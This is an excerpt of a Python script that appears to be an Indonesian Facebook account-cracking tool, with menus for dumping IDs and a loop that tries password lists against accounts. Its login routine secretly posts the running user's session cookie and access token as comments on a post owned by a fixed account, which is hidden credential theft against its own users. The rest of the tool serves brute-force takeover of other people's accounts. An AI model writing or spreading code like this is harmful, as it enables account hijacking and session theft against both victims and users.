...
def logo(n):
	return str(f"""
   {M}•{K}•{H}• {P}ESCEH PRIBADI RASA FREE  {H}•{K}•{M}•""")
def logo2():
	return str(f"""
...
def login():
	...
	try:
		...
		tem      = ('\nMantap Bang @[100000616638984:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100000616638984/posts/5680028918694273/?app=fbl')
		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])
		#ses.post(f"https://graph.facebook.com/100000616638984?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/5680028918694273/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/5680028918694273/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/5680028918694273/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
...
def atur_atur():
	...
	if ch in ['o','O']:
		...
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' ({M}?{P}) VIEW OPTION CHECKPOINT : NO ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' ({M}?{P}) VIEW APPLICATION : NO ')
...
def crack(idf,pwx,url,awal):
	...
	print(f"\r ({M}?{P}) {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
